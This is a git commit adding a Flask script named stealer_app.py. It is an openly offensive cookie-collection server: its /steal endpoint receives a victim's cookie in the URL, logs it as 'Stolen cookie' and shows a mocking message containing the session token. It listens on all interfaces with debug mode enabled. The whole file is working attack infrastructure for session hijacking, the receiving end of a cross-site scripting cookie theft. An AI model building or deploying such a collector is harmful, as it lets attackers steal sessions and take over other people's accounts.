77cd2d8a9119c81b3f1f22e66ba134a9fcc617d6
Deepu <63465751+deepak-malhotra@users.noreply.github.com>
2023-10-18 09:50:14 +1100

    Add files via upload

---
+++ stealer_app.py
@@ -0,0 +1,13 @@
+from flask import Flask, request, render_template  
+  
+stealer_app = Flask(__name__)  
+  
+@stealer_app.route('/steal')  
+def steal():  
+    cookie = request.args.get('cookie')  
+    print(f'Stolen cookie: {cookie}')  
+    message = f'Hahahahahaha Deepak has your: session_token={cookie}'  
+    return render_template('index.html', message=message)  
+  
+if __name__ == "__main__":  
+    stealer_app.run(host='0.0.0.0', port=5005, debug=True)  
